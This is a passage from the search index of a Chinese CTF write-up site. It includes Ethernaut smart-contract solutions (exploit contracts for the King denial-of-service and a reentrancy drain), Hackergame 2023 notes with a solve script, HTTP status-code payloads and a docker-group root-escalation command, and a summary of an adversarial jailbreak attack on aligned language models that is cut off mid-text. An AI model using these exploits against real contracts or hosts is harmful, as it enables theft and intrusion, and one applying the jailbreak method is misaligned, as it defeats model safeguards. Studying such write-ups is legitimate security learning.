\"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) // \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb","title":"Vault"},{"location":"ctf/writeups/ethernaut/#king","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract King { address payable king ; uint public prize ; address payable public owner ; constructor () public payable { owner = msg.sender ; king = msg.sender ; prize = msg.value ; } receive () external payable { require ( msg.value >= prize || msg.sender == owner ); king . transfer ( msg.value ); king = msg.sender ; prize = msg.value ; } function _king () public view returns ( address payable ) { return king ; } } \u5728\u66f4\u6362king\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u4f59\u989d\u8f6c\u5230\u4e0a\u4e00\u4efbking\uff0c\u53ea\u8981\u9009\u62e9\u4e0d\u63a5\u53d7\uff0c\u5373\u53ef\u4e0d\u5b8c\u6210\u6362\u4efb\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528revert\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor ( address challenge ) public payable { challenge . call { value : msg.value }( \"\" ); } fallback () external { revert (); } } \u53ea\u8981\u8f6c\u7684\u94b1\u6bd4prize(1300889614901161 wei)\u591a\u5c31\u53ef\u4ee5\u4e86\u3002","title":"King"},{"location":"ctf/writeups/ethernaut/#re-entrancy","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.12 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg.value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg.sender ] >= _amount ) { ( bool result ,) = msg.sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg.sender ] -= _amount ; } } receive () external payable {} } \u8fd9\u9898\u8003\u5bdf\u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3awithdraw\u662f\u5148\u8f6c\u8d26\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528receive\u6216fallback\u4e00\u76f4withdraw\u3002\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u540e\u6765\u53d1\u73b0\u662f\u6539\u4e86\u5408\u7ea6\u4ee3\u7801\u540e\u5fd8\u8bb0\u91cd\u65b0\u7f16\u8bd1\u4e86\uff0c\u6d6a\u8d39\u4e86\u597d\u591agas\u8d39qaq\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Reentrance */ contract Exploit { Reentrance challenge ; constructor ( address payable addr ) public payable { challenge = Reentrance ( addr ); } function exp () public { challenge . withdraw ( 0 . 001 ether ); } fallback () external payable { if ( address ( challenge ). balance >= 0 ) { challenge . withdraw ( 0 . 001 ether ); } } } \u6267\u884c\u5408\u7ea6\u524d\uff0c\u9700\u8981\u5148donate\u4fdd\u8bc1\u5408\u7ea6\u53ef\u4ee5\u53d6\u94b1\u3002 contract . donate . sendTransaction ( < exp contract addr > , { value : toWei ( \"0.001\" )})","title":"Re-entrancy"},{"location":"ctf/writeups/ethernaut/#elevator","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg.sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u8fd9\u9898\u5b66\u4e60\u4e86solidity\u4e2d\u63a5\u53e3\u7684\u4e00\u4e9b\u7528\u6cd5\uff0c\u6839\u636e\u9898\u76ee\u8be6\u89e3\u4e5f\u4e86\u89e3\u5230\u4e86view\u548cpure\u51fd\u6570\u4fee\u6539\u5668\u7684\u4f5c\u7528\uff0c\u53ef\u4ee5\u9632\u6b62\u72b6\u6001\u88ab\u7be1\u6539\uff0c\u4f46\u662f\u5373\u4f7f\u8fd9\u6837\uff0c\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u4e0d\u540c\u8f93\u5165\u5f97\u5230\u4e0d\u540c\u8f93\u51fa\u7684\u51fd\u6570\u89e3\u51fa\u672c\u9898\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Elevator */ contract Exploit { Elevator elevator ; bool top = true ; constructor ( address challenge ) public { elevator = Elevator ( challenge ); } function isLastFloor ( uint ) public returns ( bool ) { top = ! top ; // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c return top ; } function exp () public { elevator . goTo ( 1 ); } }","title":"Elevator"},{"location":"ctf/writeups/ethernaut/#privacy","text":"","title":"Privacy"},{"location":"ctf/writeups/hackergame2023/","text":"Hackergame 2023 \u00b6 Abstract \u8fd9\u6b21\u5fd9\u91cc\u5077\u95f2\u505a\u7684\uff0c\u8fd8\u803d\u6401\u4e86\u4e00\u4e9b\u4e8b\u513fqaq\u3002\u7b97\u662f\u7b2c\u4e00\u6b21partly\u5b8c\u6574\u5730\u53c2\u52a0Hackergame\uff0c\u56e0\u4e3a\u662f\u9762\u5411\u521d\u5b66\u8005\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u96be\u5ea6\u4e0d\u9ad8\u66f4\u5177\u6709\u8da3\u5473\u6027\uff0c\u7279\u6b64\u8bb0\u5f55\u4e00\u4e0b\u3002 \u4e00\u4e9b\u7b80\u5355\u7684\u9898\u76ee\u53ef\u80fd\u8bb0\u5f55\u7684\u4f1a\u6bd4\u8f83\u8349\u7387\uff0c\u4f1a\u91cd\u70b9\u8bb0\u5f55\u4e00\u4e9b\u5370\u8c61\u6df1\u523b\uff0c\u5dee\u4e00\u70b9\u5b8c\u6210\u7684\u9898\u76ee\u3002\u5bf9\u4e8e\u6ca1\u601d\u8def\u7684\u9898\u76ee\u4e5f\u7ed3\u5408\u516c\u5f00\u9898\u89e3\u8bb0\u5f55\u4e00\u4e0b\uff0c\u8865\u5145\u4e00\u4e0b\u76f8\u5173\u77e5\u8bc6\u3002 \u5b98\u65b9\u9898\u89e3 Hackergame \u542f\u52a8 \u00b6 \u7b7e\u5230\u9898\uff0c\u76f4\u63a5\u6539GET\u8bf7\u6c42\u53c2\u6570\u91cc\u7684Similarity \u732b\u54aa\u5c0f\u6d4b \u00b6 \u8003\u9a8c\u641c\u7d22\u80fd\u529b\uff0c\u90fd\u5f88\u597d\u641c\uff0cGoogle\u4e00\u4e0b\u4f60\u5c31\u77e5\u9053 \u66f4\u6df1\u66f4\u6697 \u00b6 \u9047\u4e8b\u4e0d\u51b3 F12\uff0c\u968f\u4fbf\u6eda\u4e00\u4e0b\u5c31\u627e\u5230\u4e86flag\uff08\u771f\u7684\uff0c\u90fd\u662f\u8fd0\u6c14 \u65c5\u884c\u7167\u7247 3.0 \u00b6 \u8fd8\u86ee\u6709\u610f\u601d\u7684\u793e\u5de5\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684 \u4ece\u65e5\u672c\u3001\u5b66\u672f\u4f1a\u8bae\u5165\u624b\uff0c\u5f88\u5bb9\u6613\u53d1\u73b0\u4f1a\u8bae\u540d\u79f0\u4ee5\u53ca\u5730\u70b9\u4e3a\u4e1c\u4eac\u5927\u5b66\uff0c\u6839\u636e\u5730\u56fe\u9a8c\u8bc1\u4e00\u4e0b\u5c31\u53d1\u73b0\u4e86\u90a3\u5bb6\u62c9\u9762\u9986\u3002 \u4e8e\u662f\u6839\u636e\u8981\u6c42\u67e5\u4e00\u4e0b\u4f1a\u8bae\u4e3e\u529e\u65e5\u671f\uff0c\u4ee5\u53ca\u4e1c\u4eac\u5927\u5b66\u8bfa\u8d1d\u5c14\u7269\u7406\u5b66\u5956\u83b7\u5f97\u8005\uff0c\u5f88\u5bb9\u6613\u89e3\u51fa\u7b2c\u4e00\u90e8\u5206\u7684\u7b54\u6848\u3002 \u7b2c\u4e8c\u90e8\u5206\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u6ca1\u60f3\u5230\u9644\u8fd1\u8d70\u8d70\u5c45\u7136\u8d70\u90a3\u4e48\u8fdc\uff0c\u8fd8\u662f\u9760\u4e0a\u91ce\u7ad9\u8fd9\u4e00\u4e2a\u5173\u952e\u5730\u70b9\u624d\u53d1\u73b0\u539f\u6765\u8d70\u4e86\u90a3\u4e48\u8fdc\uff0c\u90a3\u5c31\u5f88\u597d\u5b9a\u4f4d\u5230\u56fd\u7acb\u535a\u7269\u9986\u548c\u4e0a\u91ce\u516c\u56ed\u3002\u6839\u636e\u65e5\u671f\u548c\u5730\u70b9\u80fd\u641c\u5230\u4e00\u4e2a\u9152\u7684\u5c55\u89c8\u4f1a\uff0c\u7f51\u7ad9\u91cc\u627e\u5230Staff\u62db\u52df\uff0c\u7b2c\u4e8c\u90e8\u5206\u5c31\u5b8c\u6210\u4e86\u3002 \u7b2c\u4e09\u90e8\u5206\u7b2c\u4e00\u95ee\u76f4\u63a5\u770b\u4f1a\u8bae\u5b98\u7f51\u7684\u901a\u77e5\u5373\u53ef\uff0c\u7b2c\u4e8c\u90e8\u5206\uff0c\u6d77\u62a5\u76f4\u63a5\u4e0aTwitter\u641c\u4e86\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002\u5173\u4e8e 3D \u52a8\u7269\u7684\u8bdd\u80af\u5b9a\u6709\u76f8\u5173\u62a5\u9053\uff0c\u67e5\u4e86\u4e00\u4e0b\u6709\u732b\u6709\u72d7\uff0c\u8bd5\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002 \u8d5b\u535a\u4e95\u5b57\u68cb \u00b6 \u540e\u7aef\u6ca1\u6709\u505a\u4f4d\u7f6e\u662f\u5426\u5360\u7528\u68c0\u67e5\uff0c\u6240\u4ee5\u53ea\u8981\u7ed5\u8fc7\u524d\u7aef\u68c0\u67e5\u5c31\u80fd\u83b7\u5f97\u80dc\u5229\u3002 \u5976\u5976\u7684\u7761\u524d flag \u6545\u4e8b \u00b6 \u6839\u636e\u9898\u5e72\u63d0\u5230\u7684 Google\u4eb2\u513f\u5b50 \u731c\u6d4b\u548cPixels\u6709\u5173\uff0c\u5584\u7528\u641c\u7d22\u53d1\u73b0\u662fPixels\u7684\u56fe\u50cf\u88c1\u526a\u6f0f\u6d1e\uff0c\u76f4\u63a5\u5c06PNG\u6587\u4ef6\u7684END\u6570\u636e\u5757\u6dfb\u52a0\u5230\u76f8\u5e94\u4f4d\u7f6e\uff0c\u5e76\u6ca1\u6709\u5220\u9664\u88ab\u88c1\u526a\u7684\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u578b\u53f7\u4fee\u6539\u4e00\u4e0b\u957f\u5bbd\u5e76\u5220\u9664\u76f8\u5e94\u6570\u636e\u5757\u5373\u53ef\u3002 \u7f51\u4e0a\u5176\u5b9e\u6709\u76f8\u5e94\u5de5\u5177\u53ef\u4ee5\u4e00\u628a\u68ad\u3002 \u7ec4\u59d4\u4f1a\u6a21\u62df\u5668 \u00b6 \u7ec8\u4e8e\u6709\u4e00\u9053\u9700\u8981\u5199\u811a\u672c\u7684\u9898\u76ee\u4e86\uff08x \u76f4\u63a5F12\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u540e\u7aef\u662f\u4e00\u6b21\u6027\u628a\u6240\u6709\u6d88\u606f\u90fd\u53d1\u8fc7\u6765\uff0c\u90a3\u5c31\u5f88\u7b80\u5355\uff0c\u4e4b\u95f4\u627e\u51fa\u6ee1\u8db3\u8981\u6c42\u7684\u6d88\u606f\u7136\u540e\u53d1\u8d77\u64a4\u56de\u8bf7\u6c42\u5373\u53ef\u3002\u4e0d\u8fc7\u4e0d\u80fd\u4e00\u6b21\u6027\u90fd\u64a4\u56de\uff0c\u540e\u7aef\u6709Delay\u65f6\u95f4\u8981\u6c42\uff0c\u53ef\u4ee5\u6839\u636e\u6d88\u606f\u5185\u7684Delay\u4fe1\u606f\u5ef6\u8fdf\u540e\u53d1\u9001\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4e00\u76f4\u53d1\u9001\u76f4\u5230\u6210\u529f\u5373\u53ef\uff08\u4e3b\u8981\u7701\u529b\u65e0\u8111 \u89e3\u9898\u4ee3\u7801\uff08\u614e\u7528\uff0c\u6982\u7387\u4e8b\u4ef6\uff0c\u591a\u8bd5\u51e0\u6b21\u5c31\u597d\uff09 import requests import json from time import sleep cookies = { 'session' : 'token' } msg = requests . post ( 'http://202.38.93.111:10021/api/getMessages' , cookies = cookies ) msg = json . loads ( msg . text ) msg = msg [ 'messages' ] def back ( idx ): back = requests . post ( 'http://202.38.93.111:10021/api/deleteMessage' , cookies = cookies , json = { 'id' : idx }) try : back = json . loads ( back . text ) except : print ( 'err:' + back . text ) return back for id , i in enumerate ( msg ): if 'hack[' in i [ 'text' ]: t = back ( id ) # \u8fd9\u91cc\u53ef\u4ee5\u4f18\u5316\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u61d2\u764c\u72af\u4e86 while ( t . get ( 'error' ) == '\u68c0\u6d4b\u5230\u65f6\u7a7a\u7a7f\u8d8a' ): t = back ( id ) # print(id, t) flag = requests . post ( 'http://202.38.93.111:10021/api/getflag' , cookies = cookies ) flag = json . loads ( flag . text ) print ( flag ) \u866b \u00b6 \u771f\u662f\u975e\u5e38\u5de7\uff0c\u4e4b\u524d\u5c31\u5237\u5230\u8fc7\u65e0\u7ebf\u7535\u3001SSTV\u76f8\u5173\u7684\u77e5\u8bc6\uff0c\u8fd9\u6b21\u5c45\u7136\u521a\u597d\u78b0\u4e0a\u4e86\uff0c\u4e0d\u8fc7Windows\u7aef\u90a3\u4e2a\u8f6f\u4ef6\u4e0d\u600e\u4e48\u4f1a\u7528\uff0c\u770b\u5230\u624b\u673a\u7aef\u6709\u76f8\u5e94\u7684\u50bb\u74dc\u5f0f\u6536\u53d1\u8f6f\u4ef6\uff08\u4e0d\u8fc7\u662fAndroid\uff0c\u4e8e\u662f\u62ff\u51fa\u4e86\u5907\u7528\u673a\uff09\u5f88\u8f7b\u677e\u83b7\u5f97\u4e86\u7ed3\u679c\u3002 \u4e0d\u653e\u56fe\u4e86\uff0c\u5360\u4ed3\u5e93\u7a7a\u95f4\uff0c\u7b49\u4ee5\u540e\u641e\u4e2a\u56fe\u5e8a\u6216SVG JSON \u2282 YAML? \u00b6 \u5b66\u4e60\u4e86\u4e00\u4e0b Yaml\uff0c\u6839\u636eYaml 1.1\u4e0e1.2\u7684\u5dee\u5f02\uff0c\u53d1\u73b0Yaml 1.1\u65e0\u6cd5\u89e3\u6790\u5f62\u5982 1e3 \u8fd9\u6837\u7684\u6570\u5b57\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\uff0c\u8fd9\u6837\u7b2c\u4e00\u5c0f\u95ee\u5c31\u89e3\u51b3\u4e86\u3002 \u7b2c\u4e8c\u5c0f\u95ee\u6839\u636e\u641c\u7d22\u5f97\u5230 \u8fd9\u4e2a\u95ee\u9898 \u53ef\u77e5\u9053Yaml\u8981\u6c42\u952e\u503c\u662f\u552f\u4e00\u7684\u5426\u5219\u4f1a\u62a5\u9519\uff0c\u800cJSON\u6ca1\u6709\u8fd9\u4e2a\u8981\u6c42\uff0c\u8fd9\u6837\u5c31\u89e3\u5b8c\u4e86\u3002 Git? Git! \u00b6 \u8fd9\u9898\u975e\u5e38\u7684easy\uff0c\u76f4\u63a5 git reflog \uff0c\u518d git reset \u5c31\u7ed3\u675f\u4e86\u3002 HTTP \u96c6\u90ae\u518c \u00b6 \u5927\u81f4\u5c31\u662f\u4e0d\u65ad\u67e5\u6587\u6863\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u642c\u5b98\u65b9\u9898\u89e3\u4e86 \u5b98\u65b9\u9898\u89e3 200 OK. \u70b9\u51fb\u5c31\u9001\uff0c\u4ee3\u8868\u8bf7\u6c42\u6210\u529f\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 404 Not Found. \u4fee\u6539\u8def\u5f84\u5230\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u5373\u53ef\u3002 GET /x HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 400 Bad Request. \u6784\u9020\u4e0d\u7b26\u5408\u683c\u5f0f\u7684 HTTP \u8bf7\u6c42\u5373\u53ef\u3002 GET / aHTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 505 HTTP Version Not Supported. \u4fee\u6539 HTTP \u7248\u672c\u53f7\u5230\u4e00\u4e2a\u79bb\u8c31\u7684\u503c\u5373\u53ef\u3002 GET / HTTP/11\\r\\n Host: example.com\\r\\n\\r\\n 405 Method Not Allowed. \u4fee\u6539\u8bf7\u6c42\u65b9\u6cd5\u5230 POST \u7b49\u5373\u53ef\u3002 POST / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n \u63a5\u4e0b\u6765\u662f\u53ef\u80fd\u9700\u8981\u770b\u6587\u6863\u7684\u90e8\u5206\uff1a 100 Continue. \u4ee3\u8868\u670d\u52a1\u5668\u5e0c\u671b\u5ba2\u6237\u7aef\u7ee7\u7eed\u8bf7\u6c42\u6216\u8005\u5ffd\u7565\u3002\u9700\u8981\u5ba2\u6237\u7aef\u53d1\u9001 Expect: 100-continue \u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Expect: 100-continue\\r\\n\\r\\n 206 Partial Content. \u4e00\u4e2a HTTP \u8bf7\u6c42\u53ef\u4ee5\u53ea\u8bf7\u6c42\u90e8\u5206\u5185\u5bb9\uff0c\u670d\u52a1\u5668\u4e5f\u4f1a\u8fd4\u56de\u90e8\u5206\u5185\u5bb9\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=1-2\\r\\n\\r\\n 416 Range Not Satisfiable. \u4e0a\u9762\u7684 Range \u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u8303\u56f4\uff0c\u90a3\u4e48\u4e0d\u5408\u6cd5\u7684\u8303\u56f4\u5462\uff1f\u5c31\u662f 416\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=114514-1919810\\r\\n\\r\\n 304 Not Modified. \u4ee3\u8868\u6587\u4ef6\u5728\u6307\u5b9a\u6761\u4ef6\u4e0b\u6ca1\u6709\u4fee\u6539\u8fc7\uff0c\u8fd9\u91cc\u7528 If-Modified-Since \uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\\r\\n\\r\\n 412 Precondition Failed. \u8fd9\u4e2a payload \u4f7f\u7528\u4e86 ETag + If-Match\uff0cETag \u548c\u5bf9\u5e94\u7684 web \u8d44\u6e90\u5bf9\u5e94\uff0c\u7528\u6765\u533a\u5206\u5bf9\u5e94\u8d44\u6e90\u4e0d\u540c\u7684\u7248\u672c\u3002\u5ba2\u6237\u7aef\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4fe1\u606f\u6765\u8282\u7701\u5e26\u5bbd\u3002\u8fd9\u91cc If-Match \u5219\u5728\u5c1d\u8bd5\u5339\u914d\u8fd9\u4e2a ETag\uff0c\u5982\u679c\u4e0d\u5339\u914d\uff0c\u90a3\u5c31\u8fd4\u56de 412\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Match: \"bfc13a64729c4290ef5b2c2730249c88ca92d82d\"\\r\\n\\r\\n 413 Content Too Large. \u4e0d\u9700\u8981\u771f\u6b63\u8f93\u5165\u5f88\u5927\u7684 payload\uff0c\u628a Content-length \u5f04\u5f97\u5f88\u5927\u5c31\u884c\uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-length: 1145141919810\\r\\n\\r\\n 414 URI Too Long. \u5927\u6982\u9700\u8981\u5f88\u957f\u7684 URI \u8def\u5f84\uff08\u4f46\u662f\u53c8\u4e0d\u80fd\u592a\u957f\uff0c\u5426\u5219 web \u754c\u9762\u672c\u4f53\u4e0d\u4f1a\u5141\u8bb8\u8fd9\u6837\u7684\u54cd\u5e94\uff09\u3002\u5185\u5bb9\u8be6\u89c1 414.txt \u3002 \u4ee5\u4e0a\u5c31\u5df2\u7ecf\u96c6\u6ee1\u4e86 12 \u4e2a\u3002\u5728\u9a8c\u9898\u65f6\u8fd8\u6709\u4e00\u4e2a HTTP code \u6f0f\u4e86\uff1a 501 Not Implemented. \u4ee3\u8868\u670d\u52a1\u5668\u4e0d\u652f\u6301\u6b64\u529f\u80fd\u3002Nginx \u6e90\u4ee3\u7801\u4e2d\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u552f\u4e00\u53ef\u80fd\u89e6\u53d1\u7684\u5730\u65b9\u662f https://github.com/nginx/nginx/blob/a13ed7f5ed5bebdc0b9217ffafb75ab69f835a84/src/http/ngx_http_request.c#L2008 : } else { ngx_log_error ( NGX_LOG_INFO , r -> connection -> log , 0 , \"client sent unknown \\\" Transfer-Encoding \\\" : \\\" %V \\\" \" , & r -> headers_in . transfer_encoding -> value ); ngx_http_finalize_request ( r , NGX_HTTP_NOT_IMPLEMENTED ); return NGX_ERROR ; } else \u4e0a\u9762\u53ea\u5141\u8bb8 chunked \uff0c\u6240\u4ee5\u53ef\u4ee5\uff1a GET / HTTP/1.1\\r\\n Transfer-Encoding: gzip\\r\\n Host: example.com\\r\\n\\r\\n gzip \u6362\u6210\u9664\u4e86 chunked \u4ee5\u5916\u7684\u4efb\u610f\u5b57\u7b26\u4e32\u90fd\u884c\u3002 \u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff1a\u6ca1\u6709\u72b6\u6001\u7801\u662f\u600e\u4e48\u56de\u4e8b\uff1f GET /\\r\\n \u8fd9\u91cc\u5b9e\u9645\u53d1\u9001\u7684\u662f HTTP/0.9 \u8bf7\u6c42\uff0c\u5b83\u53ea\u652f\u6301 GET \uff0c\u7136\u540e\u540e\u9762\u76f4\u63a5\u63a5 URL\uff0c\u6ca1\u6709\u522b\u7684\u3002\u7136\u540e\u54cd\u5e94\u5c31\u76f4\u63a5\u54cd\u5e94\u6587\u4ef6\u5185\u5bb9\uff0c\u4e5f\u6ca1\u6709\u72b6\u6001\u7801\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002 Docker for Everyone \u00b6 \u8fd9\u9898\u8003\u70b9\u5c31\u662fdocker\u7528\u6237\u7ec4\u4e0eroot\u5176\u5b9e\u662f\u7b49\u4ef7\u7684\uff0c\u56e0\u6b64\u76f4\u63a5\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u628aflag\u6302\u8f7d\u8fdb\u5bb9\u5668\u5373\u53ef\u5728\u5bb9\u5668\u5185\u8bfb\u53d6\u3002\u53e6\u5916\u6ce8\u610f\u4e00\u4e0b\u8f6f\u8fde\u63a5\u7684\u95ee\u9898\u5373\u53ef\u3002 docker run -it --rm -v /:/outside alpine \u60dc\u5b57\u5982\u91d1 2.0 \u00b6 \u76f4\u63a5\u66b4\u529b\u7a77\u4e3e\u5373\u53ef\uff0c\u5176\u5b9e\u6ee1\u8db3\u6761\u4ef6\u7684\u60c5\u51b5\u5f88\u591a\uff0c\u76f4\u63a5\u8fb9\u8dd1\u8fb9\u8f93\u51fa\u5c31\u5f88\u5feb\u80fd\u62ff\u5230flag\u4e86\u3002 \u89e3\u9898\u4ee3\u7801\uff08\u8fc7\u4e8e\u66b4\u529b\uff09 cod_dict = [] cod_dict += [ 'nymeh1niwemflcir}echaet' ] cod_dict += [ 'a3g7}kidgojernoetlsup?h' ] cod_dict += [ 'ulw!f5soadrhwnrsnstnoeq' ] cod_dict += [ 'ct{l-findiehaai{oveatas' ] cod_dict += [ 'ty9kxborszstguyd?!blm-p' ] def get_cod_dict ( c_dict ): return '' . join ( c_dict ) def decrypt_data ( input_codes ): flags = [] for k in range ( 23 ): print ( k ) for j in range ( 23 ): for t in range ( 23 ): for p in range ( 23 ): for f in range ( 23 ): cd_dict = cod_dict . copy () cd_dict [ 0 ] = cod_dict [ 0 ][: k ] + cod_dict [ 0 ][ k ] + cod_dict [ 0 ][ k :] cd_dict [ 1 ] = cod_dict [ 1 ][: j ] + cod_dict [ 1 ][ j ] + cod_dict [ 1 ][ j :] cd_dict [ 2 ] = cod_dict [ 2 ][: t ] + cod_dict [ 2 ][ t ] + cod_dict [ 2 ][ t :] cd_dict [ 3 ] = cod_dict [ 3 ][: p ] + cod_dict [ 3 ][ p ] + cod_dict [ 3 ][ p :] cd_dict [ 4 ] = cod_dict [ 4 ][: f ] + cod_dict [ 4 ][ f ] + cod_dict [ 4 ][ f :] print ( cd_dict ) st_dict = get_cod_dict ( cd_dict ) output_chars = [ st_dict [ c ] for c in input_codes ] if 'flag{' in '' . join ( output_chars ): flags . append ( '' . join ( output_chars )) return flags flags = decrypt_data ([ 53 , 41 , 85 , 109 , 75 , 1 , 33 , 48 , 77 , 90 , 17 , 118 , 36 , 25 , 13 , 89 , 90 , 3 , 63 , 25 , 31 , 77 , 27 , 60 , 3 , 118 , 24 , 62 , 54 , 61 , 25 , 63 , 77 , 36 , 5 , 32 , 60 , 67 , 113 , 28 ]) print ( set ( flags )) \ud83e\ude90 \u9ad8\u9891\u7387\u661f\u7403 \u00b6 \u9898\u76ee\u4e2d\u7ed9\u7684\u662fasciinema\u5f55\u50cf\u6587\u4ef6\uff0c\u76f4\u63a5 asciinema cat \u5373\u53ef\u5f97\u5230\u5b57\u8282\u6d41\uff0c\u4e0d\u8fc7\u4f1a\u6709\u5f88\u591a\u989d\u5916\u4e0d\u9700\u8981\u7684\u4e1c\u897f\uff0c\u5220\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\uff0c\u770b\u5230asciinema\u5f55\u5236\u7684\u65f6\u5019\u6709raw\u9009\u9879\uff0c\u4e8e\u662f\u91cd\u65b0\u5f55\u4e86\u4e00\u904d\uff0c\u8fd9\u6837\u5b57\u8282\u6d41\u5c31\u5e72\u51c0\u5f88\u591a\uff0c\u7a0d\u5fae\u6539\u4e00\u4e0b\uff0c\u8fd0\u884c\u5373\u53ef\u3002 \ud83e\ude90 \u5c0f\u578b\u5927\u8bed\u8a00\u6a21\u578b\u661f\u7403 \u00b6 \u5f88\u65b0\u9896\u7684AI\u9898\u76ee\uff0c\u5bf9\u4e8e\u6211\u6765\u8bf4\u53ea\u80fd\u4e71\u8bd5\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u7528repeat\u5927\u6cd5\u5c31\u53ef\u5b8c\u6210\u3002 \u7b2c\u4e8c\u95ee\u5176\u5b9e\u601d\u8def\u5bf9\u7684\uff0c\u4e0d\u8fc7\u6211\u5acc\u9ebb\u70e6\uff0c\u6ca1\u6709\u53bb\u7a77\u4e3ehhh\u3002 \u540e\u9762\u4e24\u95ee\u786e\u5b9e\u53ef\u4ee5\u7684\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 LLM Attacks \u00b6 \u8bba\u6587\uff1a Universal and Transferable Adversarial Attacks on Aligned Language Models Background \u00b6 \u4e00\u4e2a Decoder-Only \u7684 LLM \u5c06\u4e00\u4e32 token \\(x_{1:n}\\) \u6620\u5c04\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u3002\u8bed\u8a00\u6a21\u578b\u6240\u9700\u8981\u5b66\u4e60\u7684\u5219\u662f\u5728\u7ed9\u5b9a\u4e4b\u524d\u7684 token \\(x_{1:n}\\) \uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u7684\u6982\u7387 \\(p(x_{n+1} | x_{1:n})\\) \u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a \\(x_i \\in {1, ... V}\\) \u90fd\u662f\u8bcd\u8868\u4e2d\u7684\u4e00\u4e2a token\u3002\u5982\u679c\u60f3\u8981\u8ba9\u6a21\u578b\u8f93\u5165\u4e00\u6bb5\u5e8f\u5217\uff0c\u5e8f\u5217\u4e2d\u6bcf\u4e00\u4e2a token \u90fd\u53ea\u4e0e\u4e4b\u524d\u7684\u6240\u6709 token \u6709\u5173\uff0c\u56e0\u6b64\u6a21\u578b\u8f93\u51fa\u4e00\u6bb5\u5e8f\u5217 \\(x_{n+1:n+H}\\) \u7684\u6982\u7387\u4e3a \\[p(x_{n+1:n+H}|x_{1:n}) = \\prod_{i=1}^H p(x_{n+i} | x_{1:n+i-1})\\] Method \u00b6 \u5982\u679c\u6211\u4eec\u5e0c\u671b\u6a21\u578b\u80fd\u591f\u8f93\u51fa\u4e00\u4e2a\u6307\u5b9a\u7684\u5e8f\u5217\uff0c\u5c31\u662f\u5e0c\u671b \\(p(x_{n+1:n+H}|x_{1:n})\\) \u5c3d\u53ef\u80fd\u9ad8\uff0c\u4ee5\u6b64\u51fa\u53d1\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4f18\u5316\u76ee\u6807 \\[\\mathcal{L}(x_{1:n}) = -\\log p(x^\\star_{n+1:n+H} | x_{1:n})\\] \u4f46\u662f\u4e0e\u5e38\u89c1\u7684\u56fe\u7247\u4e0a\u9762\u7684\u5bf9\u6297\u6837\u672c\u653b\u51fb\u4e0d\u540c\uff0cLLM \u7684\u8f93\u5165\u662f\u76f8\u5bf9\u79bb\u6563\u7684 